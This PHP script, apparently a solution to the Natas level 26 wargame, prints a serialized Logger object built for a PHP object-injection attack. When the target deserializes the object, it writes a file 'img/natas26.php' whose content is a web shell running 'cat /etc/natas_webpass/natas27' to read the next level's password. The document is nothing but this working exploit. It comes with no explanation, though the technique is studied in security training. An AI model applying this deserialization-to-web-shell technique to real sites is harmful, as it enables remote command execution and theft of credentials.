<?php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct(){
        // initialise variables
        $this->initMsg="<?php system('cat /etc/natas_webpass/natas27');?>";
        $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27');?>";
        $this->logFile = "img/natas26.php";

        // write initial message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->initMsg);
        fclose($fd);
    }

    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }

    function __destruct(){
        // write exit message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }
}

$logger = new Logger();
print(serialize($logger));
?>